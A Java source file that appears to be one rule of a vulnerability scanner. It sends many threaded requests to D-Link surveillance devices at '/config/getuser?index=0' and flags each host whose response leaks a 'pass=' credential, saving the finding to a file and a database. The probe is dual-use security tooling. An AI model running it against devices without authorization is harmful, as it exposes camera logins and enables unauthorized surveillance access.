package Vul_type;

import Request_method.RequestTemplate;
import Vul_check.VulRule;
import Vuldata_Controller.WriteFile;
import com.zsj.mapper.VulMapper;
import com.zsj.poji.vuldatas;
import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;

import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class D_link_Outmessage extends VulRule {

    public void check(int thread, List array, int len, final int outtime) throws IOException {
        for (final Object oldurl :array){
            Thread thread1 = new Thread(new Runnable() {
                public void run() {
                    String newurl=oldurl+"/config/getuser?index=0";
                    RequestTemplate requestTemplate = new RequestTemplate();
                    Map<String,Object> response=requestTemplate.GetBody(new HashMap<String, String>(),newurl,outtime);
                    Integer code = (Integer) response.get("Code");
                    String content = (String) response.get("Content");
                    try {
                        if (code!=200){
                                System.out.println(oldurl+":  Dlink监控信息泄露漏洞访问异常");
                        }
                        else {
                            if (content.indexOf("pass=")!=-1){
                                  System.out.println(oldurl+":    *****存在Dlink监控信息泄露漏洞*****");

                                final vuldatas vul = new vuldatas();
                                vul.setVul_host((String) oldurl);
                                vul.setVul_name("Dlink监控信息泄露漏洞");
                                vul.setVul_payload(newurl);
                                vul.setVul_describe("通过泄漏的账号密码访问监控内容");
                                /*
                                 * 存入临时目录
                                 * */
                                new WriteFile().writeFile("temp.txt",oldurl+":    *****存在Dlink监控信息泄露漏洞*****\n");
                                /*
                                 * 存入永久数据库
                                 * */
                                String resource = "mybatis-config.xml";
                                InputStream inputStream = Resources.getResourceAsStream(resource);
                                SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);

                                SqlSession sqlSession = sqlSessionFactory.openSession();
                                VulMapper vulMapper=sqlSession.getMapper(VulMapper.class);
                                vulMapper.add_Dlink(vul);
                                sqlSession.commit();
                                sqlSession.close();

                            }
                            else {
                                System.out.println(oldurl+":   不存在Dlink监控信息泄露漏洞");
                            }
                        }
                    }catch (Exception e){
                        System.out.println(oldurl+":   Dlink监控信息泄露漏洞连接超时或服务端已断TCP连接");
                    }
                }
            });
            thread1.start();
            thread1.interrupt();
        }
    }
}
